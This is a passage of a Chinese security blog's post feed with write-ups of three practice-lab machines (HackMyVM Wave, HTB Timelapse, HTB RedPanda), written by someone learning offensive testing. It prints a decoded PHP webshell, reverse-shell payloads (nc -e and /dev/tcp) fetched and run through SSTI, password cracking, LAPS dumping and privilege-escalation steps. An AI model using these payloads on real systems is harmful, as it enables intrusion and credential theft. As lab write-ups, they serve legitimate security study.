<p>第一次接触隧道搭建，需要好好吃透这个原理，还有docker找主机网关的部分也不是很理解，而且网上的wp各有各的解释（，好的部分是帮我复习了一下git的使用吧，还是要继续加油，沉下心。</p>
]]></content>
      <tags>
        <tag>复盘</tag>
        <tag>linux</tag>
        <tag>htb</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2024/03/15/hello-world/</url>
    <content><![CDATA[<p>一个开始。</p>
]]></content>
      <tags>
        <tag>blog</tag>
      </tags>
  </entry>
  <entry>
    <title>hackmyvm wave复盘</title>
    <url>/2024/03/22/hackmyvm-wave%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<h4 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h4><p>这个靶机我是边看视频学习边做的的，写复盘目的是理清思路，吸收知识。在这里感谢群主做的视频，链接：<a class="link"   href="https://www.bilibili.com/video/BV1Uu4m1A7BU" >https://www.bilibili.com/video/BV1Uu4m1A7BU<i class="fas fa-external-link-alt"></i></a> </p>
<h4 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h4><p>地址：<a class="link"   href="https://hackmyvm.eu/machines/machine.php?vm=Wave" >https://hackmyvm.eu/machines/machine.php?vm=Wave<i class="fas fa-external-link-alt"></i></a></p>
<p>难度：medium</p>
<p>ip：192.168.64.81</p>
<p>（后面由于靶机重置，ip改为192.168.64.100）</p>
<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p>端口扫描扫到22和80端口，先到80端口，没什么东西，然后扫目录，还挺有东西</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322155511.png" ></p>
<p>robots.txt指示要访问&#x2F;backup</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322155642.png" ></p>
<p>就是有一些目录文件，然后注意到index,log,phptest.robots,他们有备份文件证明有源文件，比如index对应index.php,phptest对应phptest.php，那么也有一个叫weevely的文件，文件后缀未知。先下载看看。</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322160208.png" ></p>
<p>一个 PHP Phar（PHP 归档）文件，思路是改名为weevely.phar，然后用脚本还原成php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$phar = new Phar(&quot;weevely.phar&quot;); $phar-&gt;extractTo(&quot;./weevely&quot;);&#x27;</span></span><br></pre></td></tr></table></figure>

<p>解压到子目录weevely下面，解压出来的php，用ai解释一下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 定义变量：密钥 $k、密钥头部 $kh、密钥尾部 $kf、参数 $p</span></span><br><span class="line"><span class="variable">$k</span> = <span class="string">&quot;3ddf0d5c&quot;</span>;</span><br><span class="line"><span class="variable">$kh</span> = <span class="string">&quot;b6e7a529b6c2&quot;</span>;</span><br><span class="line"><span class="variable">$kf</span> = <span class="string">&quot;d598a771749b&quot;</span>;</span><br><span class="line"><span class="variable">$p</span> = <span class="string">&quot;afnqDsRcBpVmU71y&quot;</span>;</span><br><span class="line"><span class="comment">// 定义函数：执行异或加密操作</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"><span class="variable">$t</span>, <span class="variable">$k</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$k</span>); <span class="comment">// 计算密钥的长度</span></span><br><span class="line">    <span class="variable">$l</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$t</span>); <span class="comment">// 计算文本的长度</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="string">&quot;&quot;</span>; <span class="comment">// 初始化结果字符串</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 循环遍历文本，执行异或加密操作</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$l</span>;) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; (<span class="variable">$j</span> &lt; <span class="variable">$c</span> &amp;&amp; <span class="variable">$i</span> &lt; <span class="variable">$l</span>); <span class="variable">$j</span>++, <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$o</span> .= <span class="variable">$t</span>[<span class="variable">$i</span>] ^ <span class="variable">$k</span>[<span class="variable">$j</span>]; <span class="comment">// 对文本中的每个字符与密钥进行异或操作，并将结果追加到$o中</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$o</span>; <span class="comment">// 返回加密后的结果</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 从输入中解析数据并尝试执行解密的PHP代码</span></span><br><span class="line"><span class="keyword">if</span> (@<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/<span class="subst">$kh</span>(.+)<span class="subst">$kf</span>/&quot;</span>, @<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>), <span class="variable">$m</span>) == <span class="number">1</span>) &#123;</span><br><span class="line">    @<span class="title function_ invoke__">ob_start</span>(); <span class="comment">// 启动输出缓冲区</span></span><br><span class="line">    @<span class="keyword">eval</span>(@<span class="title function_ invoke__">gzuncompress</span>(@<span class="title function_ invoke__">x</span>(@<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$m</span>[<span class="number">1</span>]), <span class="variable">$k</span>))); <span class="comment">// 解密并执行从输入中提取的PHP代码</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$o</span> = @<span class="title function_ invoke__">ob_get_contents</span>(); <span class="comment">// 获取输出缓冲区的内容</span></span><br><span class="line">    @<span class="title function_ invoke__">ob_end_clean</span>(); <span class="comment">// 清空输出缓冲区</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$r</span> = @<span class="title function_ invoke__">base64_encode</span>(@<span class="title function_ invoke__">x</span>(@<span class="title function_ invoke__">gzcompress</span>(<span class="variable">$o</span>), <span class="variable">$k</span>)); <span class="comment">// 对执行结果进行压缩、加密</span></span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&quot;<span class="subst">$p</span><span class="subst">$kh</span><span class="subst">$r</span><span class="subst">$kf</span>&quot;</span>); <span class="comment">// 输出加密后的结果</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>代码逻辑是：php:&#x2F;&#x2F;input也就是接受POST的数据，和$kh,$kf拼接后，先base64解密，经过x函数异或，再用gzuncompress提取出php代码交给eval执行，执行后会把执行结果交给前面一套过程逆向执行。</p>
<p>也就是说，如果我要利用eval执行命令，正常传进去后会被执行一系列逻辑变成乱的，这样自然会执行失败，<strong>思路是写一个脚本，把原先的思路逆过来，传输进去后经过处理会变成正常语句</strong>，脚本如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"><span class="variable">$t</span>,<span class="variable">$k</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="title function_ invoke__">strlen</span>(<span class="variable">$k</span>);<span class="variable">$l</span>=<span class="title function_ invoke__">strlen</span>(<span class="variable">$t</span>);<span class="variable">$o</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="variable">$l</span>;)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">0</span>;(<span class="variable">$j</span>&lt;<span class="variable">$c</span>&amp;&amp;<span class="variable">$i</span>&lt;<span class="variable">$l</span>);<span class="variable">$j</span>++,<span class="variable">$i</span>++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$o</span>.=<span class="variable">$t</span>[<span class="variable">$i</span>]^<span class="variable">$k</span>[<span class="variable">$j</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$o</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 函数照搬</span></span><br><span class="line"><span class="variable">$k</span>=<span class="string">&quot;3ddf0d5c&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$r</span>=@<span class="title function_ invoke__">base64_encode</span>(@<span class="title function_ invoke__">x</span>(@<span class="title function_ invoke__">gzcompress</span>(<span class="string">&quot;echo shell_exec(&#x27;nc -e /bin/bash 192.168.64.3 8888&#x27;);&quot;</span>),<span class="variable">$k</span>));</span><br><span class="line"><span class="comment">// 这句也可以照搬，中间写入要执行的命令</span></span><br><span class="line"><span class="keyword">print</span>(<span class="variable">$r</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>接下来就可以向weevely发送数据，现在问题是不知道他的后缀，fuzz一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wfuzz -w extension.txt -u &#x27;192.168.64.81/weevely.FUZZ&#x27;</span><br></pre></td></tr></table></figure>

<p>extension.txt里面是一些常见的php后缀，最后测出来是php7</p>
<p>指定脚本，获得要发生的数据，接下来就访问weevely.php7发送POST</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -X POST http://192.168.64.100/weevely.php7 -d <span class="string">&#x27;b6e7a529b6c2S/gvK/6sYkv9LKmvuSuYK36yNKl7MuUuZrQrrPy3eikfqjRWhFDnUAfXtFUDtQY1g2RmE30PNa1oa3Q=d598a771749b&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240323211020.png" ></p>
<p>成功反弹的第一个shell</p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>经过一番搜寻，查看到靶机对内开放了3923端口</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240323211135.png" ></p>
<p>利用socat端口转发到8001端口，访问看看</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">socat TCP-LISTEN:8001,fork TCP:localhost:3923</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240323211236.png" ></p>
<p>是一个长的比较可爱的文件管理界面，当前目录是&#x2F;root，有文件上传功能也有创建目录功能，那么思路是 <strong>创建一个.ssh目录，在里面上传自己kali的公钥，命名为authorized_keys,然后用攻击机ssh登陆</strong></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240323211509.png" ></p>
<p>上传后看一下有哪些用户名</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-23%2021.15.52.png" ></p>
<p>经过尝试，angie登陆成功</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240323211749.png" ></p>
<p>Sudo -l 查到less可以利用，只能用来阅读&#x2F;opt&#x2F;secret.txt</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240323211813.png" ></p>
<p>看题解学习到提权思路是：</p>
<p>首先less的功能是读取文件，当它读取的文件有很多行一个终端显示不下的时候，最下面可以有一个命令行，我们可以利用这一点输入命令拿到一个&#x2F;bin&#x2F;sh。然后靶机的secret.txt只有两行，这个时候我们只能去kali本机的终端操作，把终端尺寸缩到很小，自然会出现命令行。</p>
<p>输入“sudo &#x2F;usr&#x2F;bin&#x2F;less -F &#x2F;opt&#x2F;secret.txt”，然后缩小终端</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240323212531.png" ></p>
<p>缩到这么小，再输入”!&#x2F;bin&#x2F;sh”，成功拿到shell，提权成功。</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240323212632.png" ></p>
]]></content>
      <tags>
        <tag>hackmyvm</tag>
        <tag>复盘</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>htb Timelapse复盘</title>
    <url>/2024/04/08/htb-Timelapse%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<p>继续记录靶机，学习📑</p>
<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p>官方wp</p>
<p><a class="link"   href="https://developer.aliyun.com/article/1160921" >https://developer.aliyun.com/article/1160921<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://mp.weixin.qq.com/s/W6g0liTaOFJWFAMJGBwr4A" >https://mp.weixin.qq.com/s/W6g0liTaOFJWFAMJGBwr4A<i class="fas fa-external-link-alt"></i></a></p>
<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap  -p- --min-rate=1000 -T4 -A 10.10.11.152</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-08%2023.12.54.png" ></p>
<p>开了挺多端口的，可以猜测这台靶机是个域控</p>
<p>用CrackMapExec对smb扫描，看看有什么共享资源</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.10.11.152 --shares -u xxx -p &#x27;&#x27;</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408233932.png" ></p>
<p>有一个shares目录，用smbclient进行读取文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">smbclient -N //10.10.11.152/shares</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409000951.png" ></p>
<p>Dev目录下有个压缩包，get到本地</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409001044.png" ></p>
<h4 id="爆破拿到密钥"><a href="#爆破拿到密钥" class="headerlink" title="爆破拿到密钥"></a>爆破拿到密钥</h4><p>发现需要密码，里面有个.pfx文件</p>
<blockquote>
<p>PFX 文件是一种用于存储和传输加密的数字证书的文件格式。它通常包含了证书、私钥和可选的证书链，所有这些内容都被加密并存储在一个文件中。PFX 文件通常使用密码进行保护，以确保只有授权的用户可以访问其中的私钥和证书。</p>
</blockquote>
<p>先用john看看能不能爆破zip密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zip2john winrm_backup.zip &gt; ziphash</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409002050.png" ></p>
<p>拿到密码解压，成功拿到pfx文件，需要从里面导出密钥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out pfx.key</span><br></pre></td></tr></table></figure>

<p>也需要密码，再用john爆破(发现john不能用root运行，我还以为哪里出错了。。。)</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409002849.png" ></p>
<p>拿到密码继续到处key</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out pfx.key</span><br><span class="line"># -nocerts 选项告诉 OpenSSL 不要提取证书，只提取私钥。</span><br><span class="line"># pfx.key 是输出私钥的文件名。</span><br><span class="line">openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out pfx.crt</span><br><span class="line"># -clcerts 选项告诉 OpenSSL 只提取客户端证书（不包括中间证书），如果 PFX 文件中包含中间证书链，则中间证书将不会被提取。</span><br><span class="line"># -nokeys 选项告诉 OpenSSL 不要提取私钥。</span><br><span class="line"># pfx.crt 是输出证书的文件名。</span><br></pre></td></tr></table></figure>

<p>还提示要给key文件设置密码</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409003016.png" ></p>
<p>然后拿这两个文件用evil-winrm连接到主机，输入的密码是刚刚自己设置的那个</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">evil-winrm -i 10.10.11.152 -S -c pfx.crt -k pfx.key</span><br></pre></td></tr></table></figure>

<p>cd到C:\Users\legacyy\desktop，拿到user.txt</p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>查看powershell历史命令记录文件</p>
<blockquote>
<p>这个在应急响应中，检查windows主机，可以查看一下这个目录。</p>
<p>C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine</p>
</blockquote>
<p>里面有ConsoleHost_history.txt文件，拿到一个新的账号密码</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-09%2000.37.50.png" ></p>
<p>再用evil-winrm登陆</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">evil-winrm -i 10.10.11.152 -u svc_deploy -p E3R$Q62^12p7PLlC%KWaxuaV -S</span><br></pre></td></tr></table></figure>

<p><code>-S</code>: 启用安全模式，使用 SSL 加密连接。这意味着连接将通过 HTTPS 加密进行，提供更安全的通信。</p>
<p>没有-S失败了好几次。。。</p>
<p>使用net user svc_deploy</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-09%2000.52.07.png"   style="zoom:50%;" >

<blockquote>
<p>“Local Administrator Password Solution” (LAPS) is used to manage local account passwords of</p>
<p>Active Directory computers. </p>
</blockquote>
<p>LAPS_Readers这个分组说明 svc_deploy 有权从 LAPS进行读取</p>
<p>使用laps.py脚本导出域账号密码，需要绑定域名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/n00py/LAPSDumper</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409005529.png" ></p>
<p>成功拿到管理员密码，evil-winrm登陆</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">evil-winrm -i timelapse.htb -S -u Administrator -p &#x27;[ej6W8oU!8b;V3&#125;0obNE[!&#123;#&#x27;</span><br></pre></td></tr></table></figure>

<p>提权成功</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409005712.png" ></p>
<h5 id="读取密码的第二种方式"><a href="#读取密码的第二种方式" class="headerlink" title="读取密码的第二种方式"></a>读取密码的第二种方式</h5><p>使用这个命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Get-ADComputer DC01 -property &#x27;ms-mcs-admpwd&#x27;</span><br></pre></td></tr></table></figure>

<p><code>Get-ADComputer</code> 是一个 PowerShell cmdlet，用于获取 Active Directory 中计算机对象的信息。<code>-property &#39;ms-mcs-admpwd&#39;</code> 参数指定要返回的属性，其中 <code>&#39;ms-mcs-admpwd&#39;</code> 是计算机对象属性的名称。</p>
<p>这个命令的作用是获取名为 “DC01” 的计算机对象的 “ms-mcs-admpwd” 属性的值。这个属性通常用于存储 LAPS（Local Administrator Password Solution）生成的本地管理员账户的密码。 LAPS 是一种 Microsoft 提供的工具，用于管理 Windows 计算机的本地管理员密码，并确保每台计算机上的密码是唯一且定期更改的。</p>
<p>执行这个命令后，你将得到名为 “DC01” 的计算机对象的 “ms-mcs-admpwd” 属性的值，即本地管理员密码。</p>
<p>（来自ai的解释）</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-09%2000.58.57.png" ></p>
<p>也能读到密码</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>整体思路：CrackMapExec发现smb有共享资源–&gt;拿到压缩包–&gt;一系列爆破解密登陆第一个账户–&gt;历史命令文件中发现另一个账户账号密码–&gt;发现LAPS读取权限–&gt;管理员密码读取</p>
<p>涉及知识点：pfx文件，smbclient拿到共享资源，windows历史命令文件位置，LAPS服务</p>
<p>思路不算难，写完复盘也是对windows多了解了一些🙋‍♀️</p>
]]></content>
      <tags>
        <tag>复盘</tag>
        <tag>htb</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>htb RedPanda复盘</title>
    <url>/2024/09/24/htb-RedPanda%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">└─# nmap -sS -p- --min-rate=2000 10.10.11.170</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-24 16:21 HKT</span><br><span class="line">Warning: 10.10.11.170 giving up on port because retransmission cap hit (10).</span><br><span class="line">Nmap scan report for 10.10.11.170</span><br><span class="line">Host is up (0.62s latency).</span><br><span class="line">Not shown: 64603 closed tcp ports (reset), 930 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">8080/tcp open  http-proxy</span><br></pre></td></tr></table></figure>

<p>端口扫描扫到8080端口，直接访问，有个&#x2F;search，然后目录扫描也能看到&#x2F;stats，可以看到一些图片的路径，还有两个作者名字，还有一个可以生成xml文件（没什么敏感内容）的功能</p>
<p>然后看到网页源代码可以知道这个是个spring boot应用</p>
<p>主要针对这个search，尝试了sql注入，无果，后来看到了官方引导，才知道存在SSTI（下次应该自己试出来）</p>
<h4 id="SSTI漏洞"><a href="#SSTI漏洞" class="headerlink" title="SSTI漏洞"></a>SSTI漏洞</h4><p>输入<code>*&#123;8*7&#125;</code>，回显56，验证了ssti漏洞，在hacktricks找个payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*&#123;T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(&#x27;id&#x27;).getInputStream())&#125;</span><br></pre></td></tr></table></figure>

<p>可以命令执行</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240924163217.png" ></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">└─# cat /var/www/html/a.sh</span><br><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/10.10.16.14/8888 0&gt;&amp;1</span><br><span class="line">编写payload</span><br><span class="line">*&#123;T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(&#x27;curl http://10.10.16.14：9999/a.sh -o /tmp/a.sh&#x27;).getInputStream())&#125;</span><br><span class="line">*&#123;T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(&#x27;bash /tmp/a.sh&#x27;).getInputStream())&#125;</span><br></pre></td></tr></table></figure>

<p>成功拿到shell</p>
<h4 id="靶机内信息搜集"><a href="#靶机内信息搜集" class="headerlink" title="靶机内信息搜集"></a>靶机内信息搜集</h4><p>&#x2F;opt文件夹下面有挺多东西的，要耐心翻找</p>
<p>在<code>/opt/panda_search/src/main/java/com/panda_search/htb/panda_search/MainController.java</code>文件里面能够看到woodenk用户的账号密码，拿去登陆ssh，可以成功</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240924164021.png" ></p>
<p>然后实在太多东西，我跑了linpeas和pspy，主要是pspy64，可以看到</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240924165009.png" ></p>
<p>root有执行有关final…的jar包，在&#x2F;opt下面，woodenk用户还会定时删除xml文件</p>
<p>把jar包scp传输到本地，用jadx反编译了一下，看到了代码</p>
<h4 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h4><p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240924165726.png" ></p>
<p>需要审计，这部分我就是参考别人的wp努力理解可以怎么利用漏洞</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> JDOMException, IOException, JpegProcessingException &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">log_fd</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/opt/panda_search/redpanda.log&quot;</span>);</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">log_reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(log_fd);</span><br><span class="line">        <span class="keyword">while</span> (log_reader.hasNextLine()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> log_reader.nextLine();</span><br><span class="line">            <span class="keyword">if</span> (isImage(line)) &#123;</span><br><span class="line">                <span class="type">Map</span> <span class="variable">parsed_data</span> <span class="operator">=</span> parseLog(line);</span><br><span class="line">                System.out.println(parsed_data.get(<span class="string">&quot;uri&quot;</span>));</span><br><span class="line">                <span class="type">String</span> <span class="variable">artist</span> <span class="operator">=</span> getArtist(parsed_data.get(<span class="string">&quot;uri&quot;</span>).toString());</span><br><span class="line">                System.out.println(<span class="string">&quot;Artist: &quot;</span> + artist);</span><br><span class="line">                <span class="type">String</span> <span class="variable">xmlPath</span> <span class="operator">=</span> <span class="string">&quot;/credits/&quot;</span> + artist + <span class="string">&quot;_creds.xml&quot;</span>;</span><br><span class="line">                addViewTo(xmlPath, parsed_data.get(<span class="string">&quot;uri&quot;</span>).toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>main函数按顺序调用几个函数，都是在上文自定义的</p>
<hr>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">parseLog</span><span class="params">(String line)</span> &#123;</span><br><span class="line">        String[] strings = line.split(<span class="string">&quot;\\|\\|&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">&quot;status_code&quot;</span>, Integer.valueOf(Integer.parseInt(strings[<span class="number">0</span>])));</span><br><span class="line">        map.put(<span class="string">&quot;ip&quot;</span>, strings[<span class="number">1</span>]);</span><br><span class="line">        map.put(<span class="string">&quot;user_agent&quot;</span>, strings[<span class="number">2</span>]);</span><br><span class="line">        map.put(<span class="string">&quot;uri&quot;</span>, strings[<span class="number">3</span>]);</span><br><span class="line">        <span class="keyword">return</span> map;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>parseLog函数就是读取<code>/opt/panda_search/redpanda.log</code>，然后把里面的参数用｜分割，再保存，形如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">405||10.10.16.14||Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0||/error</span><br></pre></td></tr></table></figure>

<p>然后再main函数返回那个叫<code>uri</code>的参数，后面要用</p>
<hr>
<p>接着往下时getArtist函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getArtist</span><span class="params">(String uri)</span> <span class="keyword">throws</span> IOException, JpegProcessingException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">fullpath</span> <span class="operator">=</span> <span class="string">&quot;/opt/panda_search/src/main/resources/static&quot;</span> + uri;</span><br><span class="line">        <span class="type">File</span> <span class="variable">jpgFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(fullpath);</span><br><span class="line">        <span class="type">Metadata</span> <span class="variable">metadata</span> <span class="operator">=</span> JpegMetadataReader.readMetadata(jpgFile);</span><br><span class="line">        <span class="keyword">for</span> (Directory dir : metadata.getDirectories()) &#123;</span><br><span class="line">            <span class="keyword">for</span> (Tag tag : dir.getTags()) &#123;</span><br><span class="line">                <span class="keyword">if</span> (tag.getTagName() == <span class="string">&quot;Artist&quot;</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> tag.getDescription();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;N/A&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这个函数先将<code>/opt/panda_search/src/main/resources/static</code>和uri参数拼接出一个路径，加载那张图片，然后使用JpegMetadataReader读取图片里面的详细信息，相当于exiftool，如果图片解析出来有<code>Artist</code>字段，就返回，如果没有就返回空</p>
<hr>
<p>最后是addViewTo函数，path在main函数拼接好了，就是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/credits/&quot; + artist + &quot;_creds.xml //artist字段是前面函数返回的</span><br></pre></td></tr></table></figure>

<p>这个函数主要是解析xml文件，增加图像的计数次数</p>
